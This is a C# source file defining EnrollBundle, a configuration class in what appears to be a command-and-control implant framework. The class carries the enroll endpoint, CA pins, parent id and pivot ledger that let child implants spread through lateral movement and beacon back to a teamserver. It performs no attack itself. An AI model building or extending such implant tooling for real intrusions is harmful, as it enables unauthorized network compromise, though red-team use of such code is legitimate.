using System.Security.Cryptography.X509Certificates;

namespace Rod.Implant.Internal;

/// <summary>
/// Carries the inputs the lateral.move handler needs to derive a child implant
/// that enrolls back against the same teamserver (architecture.md Sec 10.1). The
/// parent's own stager token is already spent at this implant's enroll, so the
/// child token arrives in the lateral.move arguments; the bundle here is the
/// enroll endpoint, CA pin, transport profile, and the parent's own implant id
/// (named as the child's parent). A null bundle leaves derivation disabled.
/// The bundle also carries the fronted-pivot ledger the beacon loop gates
/// fronted tasking on (architecture.md Sec 5.2): one instance shared between
/// the lateral.move handler that records each Pivot child and the beacon that
/// executes its tasking.
/// </summary>
/// <remarks>
/// Lives in its own always-compiled file, apart from any handler source: the
/// program, both contact clients, and the lateral handler all consume it, so
/// it must survive the bake-time handler trim no matter which verbs a reduced
/// class keeps.
/// </remarks>
internal sealed class EnrollBundle
{
    public required string Url { get; init; }
    public required string ParentId { get; init; }
    public required TransportProfile Profile { get; init; }

    /// <summary>
    /// The teamserver CA(s) to pin at enroll, or null to trust the system roots.
    /// </summary>
    public X509Certificate2Collection? CAs { get; init; }

    /// <summary>
    /// The Pivot children this implant enrolled (architecture.md Sec 5.2):
    /// recorded by lateral.move at each Pivot-class derivation, read by the
    /// beacon loop to accept fronted tasking -- and refuse tasking marked for
    /// an implant this one never enrolled.
    /// </summary>
    public FrontedPivots Fronted { get; } = new();
}
